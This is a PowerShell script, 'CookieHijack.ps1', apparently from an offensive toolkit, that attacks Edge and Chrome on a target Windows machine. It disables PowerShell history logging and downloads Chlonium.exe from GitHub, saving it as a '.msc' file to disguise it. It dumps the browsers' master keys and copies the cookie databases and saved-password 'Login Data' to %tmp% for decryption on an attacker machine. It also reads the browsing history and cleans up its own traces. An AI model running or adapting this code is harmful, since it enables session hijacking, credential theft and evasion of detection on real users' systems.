<#
.SYNOPSIS
   Edge|Chrome Cookie Hijacking tool!

   Author: @rxwx|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: Chlonium.exe|ChloniumUI.exe
   Optional Dependencies: Invoke-WebRequest {native}
   PS cmdlet Dev version: v1.2.11

.DESCRIPTION
   To hijack session cookies we first need to dump browser Master Key and the Cookie File.
   The Cookie files (Databases) requires to be manually downloaded from target system and
   imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!

.NOTES
   Required dependencies: Edge =< 6.1.1123.0 | Chrome =< 89.0.4389.82
   Remark: Cookies are no longer stored as individual files on recent browser versions!
   Remark: The Cookie files (Databases) found will be stored on target %tmp% directory!
   Remark: The Login Data File can be imported into ChloniumUI.exe { Database field }
   to decrypt chrome browser passwords in plain text using the 'export' button!

.Parameter LocalState
   Accepts the browser 'Local State' File absoluct path (Edge|Chrome)

.Parameter ListHistory
   Enumerate Active Edge|Chrome browser typed url's history!

.EXAMPLE
   PS C:\> Get-Help .\CookieHijack.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\CookieHijack.ps1
   Dump Microsoft Edge and Google Chrome Master Keys and cookie files
   
.EXAMPLE
   PS C:\> .\CookieHijack.ps1 -ListHistory True
   Enumerate Active Chrome|Edge typed url's history and
   Dump Microsoft Edge and Google Chrome Master Keys and cookie files 

.EXAMPLE
   PS C:\> .\CookieHijack.ps1 -LocalState "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
   Dump Microsoft Edge Master Keys and cookie file

.EXAMPLE
   PS C:\> .\CookieHijack.ps1 -LocalState "$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
   Dump Google Chrome Master Keys and cookie file

.INPUTS
   None. You cannot pipe objects into CookieHijack.ps1

.OUTPUTS
   Cookie Hijacking!
   -----------------
   To hijack session cookies we first need to dump browser Master Key and Cookie Files.
   The Cookie files (Database) requires to be manually downloaded from target system and
   imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!

   Brower     : MicrosoftEdge
   Version    : 6.1.1123.0
   MasterKey  : wtXx6sM1482OWfsMXon6Am4Hi01idvFNgog3jTCsyAA=
   Database   : C:\Users\pedro\AppData\Local\Temp\Edge_Cookies

   Brower     : Chrome
   Version    : 89.0.4389.82     
   MasterKey  : 3Cms3YxFXVyJRUbulYCnxqY2dO/jubDkYBQBoYIvqfc=
   Database   : C:\Users\pedro\AppData\Local\Temp\Chrome_Cookies
   LoginData  : C:\Users\pedro\AppData\Local\Temp\Chrome_Login_Data

   Execute in attacker machine
   ---------------------------
   $MyLink = "https://raw.githubusercontent.com/ajpc500/chlonium/master/binaries/ChloniumUI/ChloniumUI.exe"
   iwr -Uri "$MyLink" -OutFile ChloniumUI.exe;.\ChloniumUI.exe

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://vimeo.com/452632559?quality=1080p
   https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-4
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ListHistory="False",
   [string]$LocalState="False"
)


$SetLogData = "False" ## Chrome 'Login Data' {sql}
$OSMajor = [environment]::OSVersion.Version.Major
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path

## Build Output Table Banner
Write-Host "`nCookie Hijacking!" -ForegroundColor Green
Write-Host "-----------------"
Write-Host "To hijack session cookies we first need to dump browser Master Key and Cookie Files."
Write-Host "The Cookie files (Database) requires to be manually downloaded from target system and"
Write-Host "imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!"

## Check if any browser versions installed are vulnerable to this!
If($LocalState -iMatch 'Google\\Chrome\\'){

   $ChromeVersion = (Get-ItemProperty -Path "HKCU:\Software\Google\Chrome\BLBeacon" -EA SilentlyContinue).version
   If($ChromeVersion -gt '89.0.4389.82'){## Browser NOT vulnerable ?? - warning msg!
      Write-Host "[warning] Cookies are no longer stored as individual files on Chrome: $ChromeVersion ?" -ForegroundColor Red -BackgroundColor Black
   }

}ElseIF($LocalState -iMatch '\\MicrosoftEdge\\'){

   $EdgeVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -EA SilentlyContinue).version
   If($EdgeVersion -gt '6.1.1123.0'){## Browser NOT vulnerable ?? - warning msg!
      Write-Host "[warning] Cookies are no longer stored as individual files on Edge: $EdgeVersion ?" -ForegroundColor Red -BackgroundColor Black
   }

}Else{## None @arguments sellected by attacker => dump bouth browsers!

   $EdgeVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -EA SilentlyContinue).version
   If($EdgeVersion -gt '6.1.1123.0'){## Browser NOT vulnerable ?? - warning msg!
      Write-Host "[warning] Cookies are no longer stored as individual files on Edge: $EdgeVersion ?" -ForegroundColor Red -BackgroundColor Black
   }
   $ChromeVersion = (Get-ItemProperty -Path "HKCU:\Software\Google\Chrome\BLBeacon" -EA SilentlyContinue).version
   If($ChromeVersion -gt '89.0.4389.82'){## Browser NOT vulnerable ?? - warning msg!
      Write-Host "[warning] Cookies are no longer stored as individual files on Chrome: $ChromeVersion ?" -ForegroundColor Red -BackgroundColor Black
   }

}

## Download Chlonium.exe from GitHub repo and Masquerade binary {.msc}
If(-not(Test-Path -Path "$Env:TMP\Chlonium.msc" -EA SilentlyContinue)){
   iwr -uri https://raw.githubusercontent.com/ajpc500/chlonium/master/binaries/Chlonium.exe -outfile $Env:TMP\Chlonium.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
   If(-not(Test-Path -Path "$Env:TMP\Chlonium.msc" -EA SilentlyContinue)){## ReCheck if appl exists!
      Write-Host "[error] fail to download $Env:TMP\Chlonium.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @CookieHijack
   }
}

## Delete Chlonium.msc logfile if exists!
If(Test-Path -Path "databse.log" -EA SilentlyContinue){
   Remove-Item -Path "database.log" -Force
}

If($ListHistory -ieq "True"){

   <#
   .SYNOPSIS
      Helper - Get Active browser (Edge|Chrome) typed url's

   .EXAMPLE
      PS C:\> .\CookieHijack.ps1 -ListHistory True

   .OUTPUTS
      Edge   : https://www.bing.com
      Edge   : https://cdn.stubdownloader.services.mozilla.com
      Edge   : https://go.microsoft.com
      Edge   : https://twitter.com
      Chrome : https://www.bing.com
      Chrome : https://www.msn.com
      Chrome : https://www.oficinadanet.com.br
   #>

   $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
   $CheckChrome = (Get-Process -Name chrome -EA SilentlyContinue).Responding
   $CheckMsedge = (Get-Process -Name msedge -EA SilentlyContinue).Responding

   If($CheckMsedge -ieq $null -and $CheckChrome -ieq $null){
      Write-Host "[:error:] None browsers (Edge|Chrome) found running on $Env:COMPUTERNAME system!" -ForegroundColor Yellow
   }


   If($CheckChrome -ieq "True"){

      Write-Host "`n"
      $UrlDatabases = @(## Google Chrome Files to scan!
         "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
         "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Visited Links"
      )
      
      ForEach($Entry in $UrlDatabases){
         $Get_Values = Get-Content -Path "$Entry" | Select-String $Regex -AllMatches | % { ($_.Matches).Value } | Sort-Object -Unique
            $Get_Values|ForEach-Object {$Key = $_
                If($Key -match $Search){
                    echo "Chrome : $_"
                }
            }
      };Write-Host ""
   }

   If($CheckMsedge -ieq "True"){

      Write-Host "`n"
      $UrlDatabases = @(## Microsoft Edge Files to scan!
         "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
         "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Visited Links"
      )

      ForEach($Entry in $UrlDatabases){
         $Get_Values = (Get-Content -Path "$Entry" | Select-String "$Regex" -AllMatches | % { ($_.Matches).Value } | Sort-Object -Unique) -replace 'ASTS','' -replace 'shttps','https' -replace 'yhttps','https'
            $Get_Values|ForEach-Object {$Key = $_
                If($Key -match $Search){
                    echo "Edge   : $_"
                }
            }
   
      };Write-Host ""
   }
   
}


If($LocalState -ieq "False"){

   <#
   .SYNOPSIS
      Helper - This function searchs for Microsoft Edge \ Google Chrome
      Master Keys and comrrespondent browser cookie files. if the attacker
      dosent input the 'Local State' file absoluct path! { -LocalState }

   .NOTES
      Required Dependencies: Chlonium.msc
      Required dependencies: Chrome =< 89.0.4389.82 | Edge =< 6.1.1123.0

   .EXAMPLE
      PS C:\> .\CookieHijack.ps1
      Dump Microsoft Edge and Google Chrome Master Keys and cookie files
   #>

   Write-Host ""
   ## Get Microsoft Edge version!
   If(-not($EdgeVersion)){$EdgeVersion = "MicrosoftEdge not found!"}

   $MEString = "$Env:LOCALAPPDATA\Microsoft\Edge"
   ## Get 'Local State' Microsoft Edge file absoluct path
   # Uri: C:\Users\pedro\AppData\Local\Microsoft\Edge\User Data\Local State
   $LocalState = Get-ChildItem -Path "$MEString" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '\\Edge\\' -and $_.Name -iMatch '(Local State)$'
   }|Select-Object -Last 1 -ExpandProperty FullName

   cd $Env:TMP;.\Chlonium.msc "$LocalState" > database.log
   $GetRawKey = Get-Content -Path "database.log" -EA SilentlyContinue | Select-String -Pattern '^(\[\+\])'
   cd $Working_Directory ## Return to @CookieHijack working directory!

   If($GetRawKey){## Parse MasterKey string!

      $GetMasterKey = $GetRawKey -Split(' ') | Select-Object -last 1

   }Else{## [error] none master keys found!

      $GetMasterKey = "none master keys found!"

   }
   
   
   ## Get Cookies File Absoluct Path!
   $MEString = "$Env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe"
   # Uri: C:\Users\pedro\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\Cookies
   $EdgeCookieFile = Get-ChildItem -Path "$MEString" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '\\MicrosoftEdge\\' -and $_.Name -iMatch '(Cookies)$'
   }|Select-Object -Last 1 -ExpandProperty FullName

   If(-not($EdgeCookieFile)){## [error] none cookie files found!

      $LocalState = "none cookie files found!"

   }Else{## Copy Cookie File to %tmp%

      Remove-Item -Path "$Env:TMP\Edge_Cookies" -ErrorAction SilentlyContinue -Force
      Copy-Item -Path "$EdgeCookieFile" -Destination "$Env:TMP\Edge_Cookies" -Force
      $LocalState = "$Env:TMP\Edge_Cookies"

   }


   ## Build Output Table
   Write-Host "Brower     : MicrosoftEdge"
   Write-Host "Version    : $EdgeVersion"   
   Write-Host "MasterKey  : $GetMasterKey"
   Write-Host "Database   : $LocalState`n"
   Start-Sleep -Seconds 1


   ## Get Google Chrome version!
   If(-not($ChromeVersion)){$ChromeVersion = "Google Chrome not found!"}
   Remove-Item -Path "database.log" -EA SilentlyContinue -Force   

   $MEString = "$Env:LOCALAPPDATA\Google\Chrome\User Data"
   ## Get 'Local State' Google Chrome file absoluct path  
   # Uri: C:\Users\pedro\AppData\Local\Google\Chrome\User Data\Local State
   $LocalState = Get-ChildItem -Path "$MEString" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '\\Chrome\\' -and $_.Name -iMatch '(Local State)$'
   }|Select-Object -Last 1 -ExpandProperty FullName

   If(-not($LocalState) -or $LocalState -ieq $null){## [error] Local State file not found!

      $GetMasterKey = "none master keys found!"
      $LocalState = "none cookie files found!"

   }Else{## Dump sellected browser masterkey and cookie file!

      cd $Env:TMP;.\Chlonium.msc "$LocalState" > database.log
      $GetRawKey = Get-Content -Path "database.log" -EA SilentlyContinue | Select-String -Pattern '^(\[\+\])'
      cd $Working_Directory ## Return to @CookieHijack working directory!

      If($GetRawKey){## Parse MasterKey string!

         $GetMasterKey = $GetRawKey -Split(' ') | Select-Object -last 1

         ## Get Cookies File Absoluct Path!
         $MEString = "$Env:LOCALAPPDATA\Google\Chrome\User Data"
         # Uri: C:\Users\pedro\AppData\Local\Google\Chrome\User Data\Default\Cookies
         $ChromeCookieFile = Get-ChildItem -Path "$MEString" -Recurse -EA SilentlyContinue -Force | Where-Object {
            $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '\\Default\\' -and $_.Name -iMatch '(Cookies)$'
         }|Select-Object -Last 1 -ExpandProperty FullName

         If(-not($ChromeCookieFile) -or $ChromeCookieFile -ieq $null){## [error] none cookie files found!

            $LocalState = "none cookie files found!"

         }Else{## Copy Cookie File to %tmp%
        
            Remove-Item -Path "$Env:TMP\Chrome_Cookies" -ErrorAction SilentlyContinue -Force
            Copy-Item -Path "$ChromeCookieFile" -Destination "$Env:TMP\Chrome_Cookies" -Force
            $LocalState = "$Env:TMP\Chrome_Cookies"

         }

      }Else{## [error] none master keys found!

         $GetMasterKey = "none master keys found!"
         $LocalState = "none cookie files found!"

      }

   }
   
   <#
   .SYNOPSIS
      Helper - Retrieving Saved Passwords from Chrome
      
   .DESCRIPTION
      With our master key from before, we can provide the 'Login Data' file
      to the Chlonium UI in lieu of our previous 'Cookies' file. Rather than
      import these saved credentials into our attacker Chrome browser, we'll
      just export them to a text file to view them in plaintext { export }.
   #>
   
   $MEString = "$Env:LOCALAPPDATA\Google\Chrome\User Data"
   ## Uri: C:\Users\pedro\AppData\Google\Chrome\User Data\Default\Login Data
   $LogData = Get-ChildItem -Path "$MEString" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '\\Default\\' -and $_.Name -iMatch '(Login Data)$'
   }|Select-Object -Last 1 -ExpandProperty FullName
 
   If($LogData){$SetLogData = "True"
      Remove-Item -Path "$Env:TMP\Chrome_Login_Data" -EA SilentlyContinue -Force
      Copy-Item -Path "$LogData" -Destination "$Env:TMP\Chrome_Login_Data" -Force
   }   
   

   ## Build Output Table
   Write-Host "Brower     : Chrome"
   Write-Host "Version    : $ChromeVersion"   
   Write-Host "MasterKey  : $GetMasterKey"
   Write-Host "Database   : $LocalState"
   If($SetLogData -ieq "True"){
      Write-Host "LoginData  : $Env:TMP\Chrome_Login_Data"
   }
   

}Else{

   <#
   .SYNOPSIS
      Helper - This function searchs for user input browser
      for Master Keys and comrrespondent browser cookie files!
      
   .NOTES
      Required Dependencies: Chlonium.msc
      Required dependencies: Chrome =< 89.0.4389.82 | Edge =< 6.1.1123.0

   .EXAMPLE
      PS C:\> .\CookieHijack.ps1 -LocalState "$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
      Dump Google Chrome Master Keys and cookie file
      
   .EXAMPLE
      PS C:\> .\CookieHijack.ps1 -LocalState "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
      Dump Microsoft Edge Master Keys and cookie file     
   #>

   Write-Host ""
   ## Get $LocalState browser sellected!
   If($LocalState -iMatch 'Microsoft\\Edge'){

      $Browser = "MicrosoftEdge"
      ## Get MicrosoftEdge version!
      $BrowserVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -EA SilentlyContinue).version
      If(-not($BrowserVersion)){$BrowserVersion = "Microsoft Edge not found!"}       

   }ElseIf($LocalState -iMatch 'Google\\Chrome'){

      $Browser = "Chrome"    
      ## Get Google Chrome version!
      $BrowserVersion = (Get-ItemProperty -Path "HKCU:\Software\Google\Chrome\BLBeacon" -EA SilentlyContinue).version
      If(-not($BrowserVersion)){$BrowserVersion = "Google Chrome not found!"}      

   }Else{## [error]  browser NOT supported!

      Write-Host "[error] '$LocalState' String NOT supported?`n`n" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @CookieHijack

   }


   cd $Env:TMP;.\Chlonium.msc "$LocalState" > database.log
   $GetRawKey = Get-Content -Path "database.log" -EA SilentlyContinue | Select-String -Pattern '^(\[\+\])'
   cd $Working_Directory ## Return to @CookieHijack working directory!

   If($GetRawKey){## Parse MasterKey string!

      $GetMasterKey = $GetRawKey -Split(' ') | Select-Object -last 1

   }Else{## [error] none master key found!

      $GetMasterKey = "none master key found!"

   }


   ## Get Cookies File Absoluct Path!
   # Uri: C:\Users\pedro\AppData\Local\Google\Chrome\User Data\Default\Cookies
   # Uri: C:\Users\pedro\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC#!001\MicrosoftEdge\Cookies
   $BrowserCookieFile = Get-ChildItem -Path "$Env:LOCALAPPDATA" -Recurse -EA SilentlyContinue -Force | Where-Object { 
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch "$Browser" -and $_.Name -iMatch '(Cookies)$'
   }|Select-Object -Last 1 -ExpandProperty FullName
   
   If(-not($BrowserCookieFile)){## [error] none cookie file found!

      $LocalState = "none cookie files found!"

   }Else{## Copy Cookie File to %tmp%
        
      Remove-Item -Path "$Env:TMP\${browser}_Cookies" -ErrorAction SilentlyContinue -Force
      Copy-Item -Path "$BrowserCookieFile" -Destination "$Env:TMP\${browser}_Cookies" -Force
      $LocalState = "$Env:TMP\${browser}_Cookies"

   }
   
   <#
   .SYNOPSIS
      Helper - Retrieving Saved Passwords from Chrome
      
   .DESCRIPTION
      With our master key from before, we can provide the 'Login Data' file
      to the Chlonium UI in lieu of our previous 'Cookies' file. Rather than
      import these saved credentials into our attacker Chrome browser, we'll
      just export them to a text file to view them in plaintext { export }.
   #>
   
   $MEString = "$Env:LOCALAPPDATA\Google\Chrome\User Data"
   ## Uri: C:\Users\pedro\AppData\Google\Chrome\User Data\Default\Login Data
   $LogData = Get-ChildItem -Path "$MEString" -Recurse -EA SilentlyContinue -Force | Where-Object {
      $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '\\Default\\' -and $_.Name -iMatch '(Login Data)$'
   }|Select-Object -Last 1 -ExpandProperty FullName
 
   If($LogData){$SetLogData = "True"
      Remove-Item -Path "$Env:TMP\Chrome_Login_Data" -EA SilentlyContinue -Force
      Copy-Item -Path "$LogData" -Destination "$Env:TMP\Chrome_Login_Data" -Force
   }   


   ## Build Output Table
   Write-Host "Brower     : $Browser"
   Write-Host "Version    : $BrowserVersion"   
   Write-Host "MasterKey  : $GetMasterKey"
   Write-Host "Database   : $LocalState"
   If($SetLogData -ieq "True"){
      Write-Host "LoginData  : $Env:TMP\Chrome_Login_Data"
   }

}


Start-Sleep -Seconds 1
## Output Table { ChloniumUI.exe }
Write-Host "`nExecute on attacker machine" -ForegroundColor Yellow
Write-Host "---------------------------"
Write-Host "`$MyLink = `"https://raw.githubusercontent.com/ajpc500/chlonium/master/binaries/ChloniumUI/ChloniumUI.exe`""
Write-Host "iwr -Uri `"`$MyLink`" -OutFile ChloniumUI.exe;.\ChloniumUI.exe`n"


<#
.SYNOPSIS
   Helper - Delete ALL artifacts left behind!
   
.NOTES
   This function will NOT delete the cookie files stored under %tmp%
#>

Remove-Item -Path "$Env:TMP\Chlonium.msc" -EA SilentlyContinue -Force
Remove-Item -Path "$Env:TMP\database.log" -EA SilentlyContinue -Force
